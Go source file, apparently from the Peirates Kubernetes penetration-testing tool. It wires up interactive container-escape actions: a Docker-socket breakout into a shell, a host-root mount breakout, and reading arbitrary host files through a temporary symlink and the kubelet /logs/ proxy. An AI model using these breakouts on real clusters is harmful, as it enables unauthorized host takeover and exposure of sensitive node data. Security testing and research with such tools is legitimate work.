package app

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"path"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/ergochat/readline"
	"github.com/inguardians/peirates/internal/kube"
	"github.com/inguardians/peirates/internal/modules/containerescape"
	"github.com/inguardians/peirates/internal/modules/dockersocket"
	"github.com/inguardians/peirates/internal/modules/escapeutil"
	"github.com/inguardians/peirates/internal/modules/hostlog"
	"github.com/inguardians/peirates/internal/modules/hostroot"
	"golang.org/x/term"
	"k8s.io/apimachinery/pkg/util/validation"
)

const dockerImagePrompt = "Existing image reference (must contain /bin/sh and chroot): "

var scanContainerEscapes = func() error {
	return containerescape.Run(context.Background(), os.Stdout)
}

var probeDockerSocket = dockersocket.Probe
var runDockerSocketBreakout = dockersocket.Launch
var runHostRootBreakout = hostroot.Launch
var runHostRootBreakoutAt = hostroot.LaunchAt
var readHostLogFile = hostlog.ReadFile
var findAvailableDockerSocketPaths = func() []string {
	candidates := escapeutil.DockerSocketPaths(os.Getenv("DOCKER_HOST"), nil)
	return availableDockerSocketPaths(candidates)
}
var canCompleteDockerImagePrompt = supportsDockerImagePromptCompletion
var readDockerImageCompletionLine = readDockerImageLineWithCompletion

var launchDockerSocketBreakout = func() error {
	return launchDockerSocketBreakoutWithStreams(os.Stdin, os.Stdout, os.Stderr)
}

var launchHostRootBreakout = func() error {
	return launchHostRootBreakoutWithStreams(os.Stdin, os.Stdout, os.Stderr)
}

var launchHostLogSymlinkRead = func(connection ServerInfo) error {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	return launchHostLogSymlinkReadWithStreams(
		ctx, connection, kube.NewClient(), os.Getenv, os.Stdin, os.Stdout, os.Stderr,
	)
}

type kubeletLogProxyFetcher struct {
	client     *kube.Client
	connection ServerInfo
	node       string
}

func (fetcher *kubeletLogProxyFetcher) Probe(ctx context.Context) error {
	if fetcher.client == nil {
		return errors.New("kubernetes client is required")
	}
	allowed, err := fetcher.client.AuthCanIResource(ctx, fetcher.connection, kube.ResourceAttributes{
		Verb:        "get",
		Resource:    "nodes",
		Subresource: "proxy",
		Namespace:   "",
	})
	if err != nil {
		return fmt.Errorf("review get access to nodes/proxy: %w", err)
	}
	if !allowed {
		return errors.New("authorization denied for get access to nodes/proxy")
	}
	route, err := kube.NodeProxyLogPath(fetcher.node)
	if err != nil {
		return err
	}
	options := kube.RawRequestOptions{
		Method:            http.MethodHead,
		APIPath:           route,
		Timeout:           kube.DefaultRawRequestTimeout,
		MaxResponseBytes:  1,
		MaxErrorBodyBytes: kube.DefaultRawErrorBodyLimit,
	}
	_, err = fetcher.rawRequest(ctx, options)
	var statusError *kube.HTTPStatusError
	if !errors.As(err, &statusError) || statusError.StatusCode != http.StatusMethodNotAllowed {
		if err != nil {
			return fmt.Errorf("probe kubelet /logs/ through nodes/proxy: %w", err)
		}
		return nil
	}

	// Some proxies reject HEAD even when the file server is enabled. A one-byte
	// GET proves the route without retaining its directory listing.
	options.Method = http.MethodGet
	_, err = fetcher.rawRequest(ctx, options)
	if errors.Is(err, kube.ErrRawResponseTooLarge) {
		return nil
	}
	if err != nil {
		return fmt.Errorf("probe kubelet /logs/ through nodes/proxy: %w", err)
	}
	return nil
}

func (fetcher *kubeletLogProxyFetcher) Read(ctx context.Context, logPath string) ([]byte, error) {
	components, err := splitHostLogPath(logPath)
	if err != nil {
		return nil, err
	}
	route, err := kube.NodeProxyLogPath(fetcher.node, components...)
	if err != nil {
		return nil, err
	}
	return fetcher.rawRequest(ctx, kube.RawRequestOptions{
		Method:            http.MethodGet,
		APIPath:           route,
		Timeout:           kube.DefaultRawRequestTimeout,
		MaxResponseBytes:  kube.DefaultRawResponseLimit,
		MaxErrorBodyBytes: kube.DefaultRawErrorBodyLimit,
	})
}

func (fetcher *kubeletLogProxyFetcher) rawRequest(ctx context.Context, options kube.RawRequestOptions) ([]byte, error) {
	request := fetcher.client.RawAPIRequest
	if request == nil {
		request = kube.RawRequest
	}
	return request(ctx, fetcher.connection, options)
}

func splitHostLogPath(logPath string) ([]string, error) {
	if logPath == "" || path.IsAbs(logPath) || path.Clean(logPath) != logPath || strings.ContainsRune(logPath, '\x00') {
		return nil, fmt.Errorf("invalid relative kubelet log path %q", logPath)
	}
	components := strings.Split(logPath, "/")
	for _, component := range components {
		if component == "" || component == "." || component == ".." {
			return nil, fmt.Errorf("invalid relative kubelet log path %q", logPath)
		}
	}
	return components, nil
}

func launchHostLogSymlinkReadWithStreams(
	ctx context.Context,
	connection ServerInfo,
	client *kube.Client,
	getenv func(string) string,
	stdin io.Reader,
	stdout, stderr io.Writer,
) error {
	reader := bufio.NewReader(stdin)
	mountPoint, err := readEscapePromptLine(reader, stdout, "Mounted host-log path [auto-detect]: ")
	if err != nil && !errors.Is(err, io.EOF) {
		return fmt.Errorf("read host-log mount point: %w", err)
	}
	if err := validateOptionalHostLogMountPoint(mountPoint); err != nil {
		return err
	}

	defaultNode := ""
	if getenv != nil {
		defaultNode = strings.TrimSpace(getenv("NODE_NAME"))
	}
	nodePrompt := "Kubernetes node name: "
	if defaultNode != "" {
		nodePrompt = fmt.Sprintf("Kubernetes node name [%s]: ", defaultNode)
	}
	node, err := readEscapePromptLine(reader, stdout, nodePrompt)
	if err != nil && !errors.Is(err, io.EOF) {
		return fmt.Errorf("read Kubernetes node name: %w", err)
	}
	if node == "" {
		node = defaultNode
	}
	if _, err := kube.NodeProxyLogPath(node); err != nil {
		return fmt.Errorf("invalid Kubernetes node name: %w", err)
	}
	if problems := validation.IsDNS1123Subdomain(node); len(problems) > 0 {
		return fmt.Errorf("invalid Kubernetes node name %q: %s", node, strings.Join(problems, "; "))
	}

	target, err := readEscapePromptLine(reader, stdout, "Absolute host target path: ")
	if err != nil && !errors.Is(err, io.EOF) {
		return fmt.Errorf("read host target path: %w", err)
	}
	if err := validateHostLogTarget(target); err != nil {
		return err
	}

	requestedMount := mountPoint
	if requestedMount == "" {
		requestedMount = "[auto-detect]"
	}
	fmt.Fprintf(stdout, "Requested host-log mount: %s\n", requestedMount)
	fmt.Fprintf(stdout, "Kubernetes node: %s\n", node)
	fmt.Fprintf(stdout, "Host target: %s\n", target)
	fmt.Fprintln(stderr, "Warning: this action can expose sensitive node data and temporarily creates one symlink under the selected host-log mount.")

	result, err := readHostLogFile(ctx, hostlog.Options{
		MountPoint: mountPoint,
		TargetPath: target,
		Fetcher: &kubeletLogProxyFetcher{
			client:     client,
			connection: connection,
			node:       node,
		},
	})
	if err != nil {
		return err
	}

	fmt.Fprintln(stdout, "Kubelet /logs/ API proxy preflight succeeded.")
	fmt.Fprintf(stdout, "Selected host-log mount: %s (node path %s)\n", result.MountPoint, result.HostLogRoot)
	if result.HostPathOriginUnproven {
		fmt.Fprintln(stdout, "Mountinfo did not retain a /var/log root for the exact /var/log destination; hostPath origin remains unproven.")
	}
	fmt.Fprintf(stdout, "Temporary host-log symlink removed: %s\n", filepath.Join(result.MountPoint, path.Base(result.LogPath)))
	fmt.Fprintf(stdout, "Reached Kubernetes node %s through the kubelet log proxy; this does not prove access to the physical host.\n", node)
	fmt.Fprintln(stdout, "Host file content follows (treat as sensitive):")
	if _, err := stdout.Write(result.Content); err != nil {
		return fmt.Errorf("write host file content: %w", err)
	}
	return nil
}

func validateOptionalHostLogMountPoint(mountPoint string) error {
	if mountPoint == "" {
		return nil
	}
	if strings.ContainsRune(mountPoint, '\x00') || !filepath.IsAbs(mountPoint) {
		return fmt.Errorf("host-log mount point %q must be absolute", mountPoint)
	}
	if cleaned := filepath.Clean(mountPoint); cleaned != mountPoint {
		return fmt.Errorf("host-log mount point %q is not normalized; use %q", mountPoint, cleaned)
	}
	return nil
}

func validateHostLogTarget(target string) error {
	if target == "" {
		return errors.New("absolute host target path is required")
	}
	if strings.ContainsRune(target, '\x00') || !filepath.IsAbs(target) {
		return fmt.Errorf("host target path %q must be absolute", target)
	}
	cleaned := filepath.Clean(target)
	if cleaned != target {
		return fmt.Errorf("host target path %q is not normalized; use %q", target, cleaned)
	}
	if cleaned == string(filepath.Separator) {
		return errors.New("host target path must name one file and must not be filesystem root")
	}
	return nil
}

func launchDockerSocketBreakoutWithStreams(stdin io.Reader, stdout, stderr io.Writer) error {
	reader := bufio.NewReader(stdin)
	if err := writeAvailableDockerSocketPaths(stdout, findAvailableDockerSocketPaths()); err != nil {
		return fmt.Errorf("list available Docker socket paths: %w", err)
	}
	socketPath, err := readEscapePromptLine(reader, stdout,
		"Docker socket path [/var/run/docker.sock]: ")
	if err != nil && !errors.Is(err, io.EOF) {
		return fmt.Errorf("read Docker socket path: %w", err)
	}
	if socketPath == "" {
		socketPath = "/var/run/docker.sock"
	}
	finding, err := probeDockerSocket(context.Background(), dockersocket.Options{SocketPath: socketPath})
	if err != nil {
		return fmt.Errorf("probe Docker socket: %w", err)
	}
	if finding.ServerVersion != "" {
		fmt.Fprintf(stdout, "Docker daemon %s (%s/%s) is reachable through %s.\n",
			finding.ServerVersion, finding.OperatingSystem, finding.Architecture, socketPath)
	}
	if finding.Caveat != "" {
		fmt.Fprintln(stdout, finding.Caveat)
	}
	availableImages := dockerImageCompletionCandidates(finding.AvailableImages)
	if len(availableImages) > 0 {
		fmt.Fprintf(stdout, "Existing tagged images: %s\n", strings.Join(availableImages, ", "))
	}

	image, err := readDockerImageReference(reader, stdin, stdout, stderr, availableImages)
	if err != nil && !errors.Is(err, io.EOF) {
		return fmt.Errorf("read Docker image: %w", err)
	}
	if image == "" {
		return errors.New("an existing Docker image reference is required")
	}

	return runDockerSocketBreakout(context.Background(), dockersocket.Options{
		SocketPath: socketPath,
		Image:      image,
		Stdin:      remainingEscapeInput(reader, stdin),
		Stdout:     stdout,
		Stderr:     stderr,
	})
}

func dockerImageCompletionCandidates(images []string) []string {
	return escapeutil.SortedUnique(images)
}

func setUpDockerImageCompletion(images []string) *readline.PrefixCompleter {
	items := make([]*readline.PrefixCompleter, 0, len(images))
	for _, image := range dockerImageCompletionCandidates(images) {
		items = append(items, readline.PcItem(image))
	}
	return readline.NewPrefixCompleter(items...)
}

func readDockerImageReference(reader *bufio.Reader, original io.Reader, stdout, stderr io.Writer, images []string) (string, error) {
	// Keep using the shared buffered reader when input is piped or the socket
	// prompt has already read ahead. This preserves all subsequent shell input.
	if reader.Buffered() > 0 || !canCompleteDockerImagePrompt(original, stdout, stderr) {
		return readEscapePromptLine(reader, stdout, dockerImagePrompt)
	}
	return readDockerImageCompletionLine(original, stdout, stderr, images)
}

func supportsDockerImagePromptCompletion(stdin io.Reader, stdout, stderr io.Writer) bool {
	input, ok := stdin.(*os.File)
	if !ok || input.Fd() != os.Stdin.Fd() || !term.IsTerminal(int(input.Fd())) {
		return false
	}
	return writerIsTerminal(stdout) || writerIsTerminal(stderr)
}

func writerIsTerminal(writer io.Writer) bool {
	file, ok := writer.(*os.File)
	return ok && term.IsTerminal(int(file.Fd()))
}

func readDockerImageLineWithCompletion(stdin io.Reader, stdout, stderr io.Writer, images []string) (string, error) {
	lineReader, err := readline.NewEx(&readline.Config{
		Prompt:                 dockerImagePrompt,
		HistoryLimit:           -1,
		DisableAutoSaveHistory: true,
		AutoComplete:           setUpDockerImageCompletion(images),
		InterruptPrompt:        "^C",
		EOFPrompt:              "exit",
		Stdin:                  &singleByteReader{reader: stdin},
		Stdout:                 stdout,
		Stderr:                 stderr,
	})
	if err != nil {
		return "", err
	}
	defer lineReader.Close()

	line, err := lineReader.Readline()
	return strings.TrimSpace(line), err
}

// singleByteReader prevents readline's private bufio.Reader from retaining
// bytes intended for the breakout shell after the image prompt completes.
type singleByteReader struct {
	reader io.Reader
}

func (reader *singleByteReader) Read(buffer []byte) (int, error) {
	if len(buffer) == 0 {
		return 0, nil
	}
	return reader.reader.Read(buffer[:1])
}

func availableDockerSocketPaths(candidates []string) []string {
	var available []string
	for _, path := range candidates {
		info, err := os.Lstat(path)
		if err != nil || info.Mode()&os.ModeSymlink != 0 || info.Mode()&os.ModeSocket == 0 {
			continue
		}
		available = append(available, path)
	}
	return escapeutil.SortedUnique(available)
}

func writeAvailableDockerSocketPaths(stdout io.Writer, paths []string) error {
	if len(paths) == 0 {
		_, err := fmt.Fprintln(stdout, "Available Docker socket paths: none found")
		return err
	}
	if _, err := fmt.Fprintln(stdout, "Available Docker socket paths:"); err != nil {
		return err
	}
	for _, path := range paths {
		if _, err := fmt.Fprintf(stdout, "- %s\n", path); err != nil {
			return err
		}
	}
	return nil
}

func launchHostRootBreakoutWithStreams(stdin io.Reader, stdout, stderr io.Writer) error {
	reader := bufio.NewReader(stdin)
	target, err := readEscapePromptLine(reader, stdout,
		"Mounted host-root path [auto-detect]: ")
	if err != nil && !errors.Is(err, io.EOF) {
		return fmt.Errorf("read host-root path: %w", err)
	}
	if target == "" {
		return runHostRootBreakout(remainingEscapeInput(reader, stdin), stdout, stderr)
	}
	return runHostRootBreakoutAt(target, remainingEscapeInput(reader, stdin), stdout, stderr)
}

func readEscapePromptLine(reader *bufio.Reader, stdout io.Writer, prompt string) (string, error) {
	if _, err := fmt.Fprint(stdout, prompt); err != nil {
		return "", err
	}
	line, err := reader.ReadString('\n')
	return strings.TrimSpace(line), err
}

func remainingEscapeInput(reader *bufio.Reader, original io.Reader) io.Reader {
	if reader.Buffered() == 0 {
		return original
	}
	return reader
}
